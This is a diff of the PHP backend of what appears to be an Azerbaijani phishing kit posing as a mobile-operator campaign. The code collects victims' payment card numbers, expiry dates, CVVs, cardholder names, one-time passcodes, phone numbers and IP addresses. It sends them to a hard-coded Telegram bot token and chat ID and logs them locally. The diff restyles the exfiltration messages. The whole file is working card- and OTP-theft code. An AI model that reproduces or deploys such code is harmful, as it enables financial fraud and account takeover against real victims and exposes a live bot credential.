@@ -5,7 +5,7 @@ if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
     die('🚫 Giriş qadağandır!');
 }
 
-// BOT MƏLUMATLARI - BURAYA ÖZ TOKENİNİ YAZ
+// BOT MƏLUMATLARI
 $botToken = '8800834045:AAEgSbAX3Iai2AbI18-wIQODCsEvesgk83o';
 $chatId = '-1003937068249';
 
@@ -22,7 +22,7 @@ $otp = isset($_POST['otp']) ? trim(strip_tags($_POST['otp'])) : '';
 $campaign = isset($_POST['campaign']) ? trim(strip_tags($_POST['campaign'])) : '';
 $type = isset($_POST['type']) ? trim(strip_tags($_POST['type'])) : '';
 
-// SIRALI ID - HƏR MESAJ ÜÇÜN AYRI
+// SIRALI ID
 $counterFile = 'counter.txt';
 if (file_exists($counterFile)) {
     $id = (int)file_get_contents($counterFile) + 1;
@@ -48,32 +48,52 @@ function sendToTelegram($message) {
     return $httpCode;
 }
 
-// 1. NÖMRƏ MESAJI
-if ($type === 'phone_only') {
-    $message = "📞 YENİ NÖMRƏ #" . $id . "\n────────────────────────\n📱 Nömrə: " . $phone . "\n────────────────────────";
-    sendToTelegram($message);
-    header('Content-Type: application/json');
-    echo json_encode(['status' => 'success', 'id' => $id]);
-    exit;
-}
-
-// 2. KART MESAJI
+// ============================================================
+// 🔥 1. KART MESAJI (ORİJİNAL 720 SƏTİRLİK KODDAKİ KİMİ)
+// ============================================================
 if ($type === 'card_only' && !empty($cardNumber)) {
-    $message = "💳 KART GİRİŞİ #" . $id . "\n────────────────────────\n📱 Nömrə: " . $phone . "\n💰 Tutar: " . $amount . " AZN\n💳 Kart: " . $cardNumber . "\n📅 Tarix: " . $cardExpiry . "\n🔐 CVV: " . $cardCvv . "\n👤 İsim: " . $cardName . "\n🌐 IP: " . $ip;
-    if (!empty($campaign)) $message .= "\n📦 Paket: " . $campaign;
-    $message .= "\n────────────────────────";
+    // IP-ni yoxla
+    $userIP = !empty($ip) ? $ip : 'N/A';
+    
+    $message = "💳 **YENİ KART BİLGİSİ** 💳\n\n";
+    $message .= "📱 **Operator:** " . $operator . "\n";
+    $message .= "☎️ **Nömrə:** +994" . $phone . "\n";
+    $message .= "🎁 **Kampaniya:** " . $amount . " - " . $campaign . "\n\n";
+    $message .= "👤 **Kart Sahibi:** " . $cardName . "\n";
+    $message .= "💳 **Kart:** `" . $cardNumber . "`\n";
+    $message .= "📅 **Bitiş:** `" . $cardExpiry . "`\n";
+    $message .= "🔐 **CVV:** `" . $cardCvv . "`\n\n";
+    $message .= "🌐 **IP:** `" . $userIP . "`";
+    
     sendToTelegram($message);
+    
+    $logData = date('Y-m-d H:i:s') . " | ID: #$id | KART | NÖMRƏ: $phone | IP: $ip\n";
+    file_put_contents('telegram_log.txt', $logData, FILE_APPEND);
+    
     header('Content-Type: application/json');
     echo json_encode(['status' => 'success', 'id' => $id]);
     exit;
 }
 
-// 3. OTP MESAJI
+// ============================================================
+// 🔥 2. OTP MESAJI (ORİJİNAL 720 SƏTİRLİK KODDAKİ KİMİ)
+// ============================================================
 if (!empty($otp)) {
-    $message = "🔑 OTP TƏSDİQİ #" . $id . "\n────────────────────────\n📱 Nömrə: " . $phone . "\n🔑 OTP: " . $otp . "\n🌐 IP: " . $ip;
-    if (!empty($campaign)) $message .= "\n📦 Paket: " . $campaign;
-    $message .= "\n────────────────────────";
+    $userIP = !empty($ip) ? $ip : 'N/A';
+    
+    $message = "🔑 **OTP TƏSDİQİ** 🔑\n\n";
+    $message .= "📱 **Nömrə:** +994" . $phone . "\n";
+    $message .= "🔑 **OTP Kodu:** `" . $otp . "`\n";
+    $message .= "🌐 **IP:** `" . $userIP . "`";
+    if (!empty($campaign)) {
+        $message .= "\n📦 **Paket:** " . $campaign;
+    }
+    
     sendToTelegram($message);
+    
+    $logData = date('Y-m-d H:i:s') . " | ID: #$id | OTP: $otp | NÖMRƏ: $phone | IP: $ip\n";
+    file_put_contents('telegram_log.txt', $logData, FILE_APPEND);
+    
     header('Content-Type: application/json');
     echo json_encode(['status' => 'success', 'id' => $id]);
     exit;
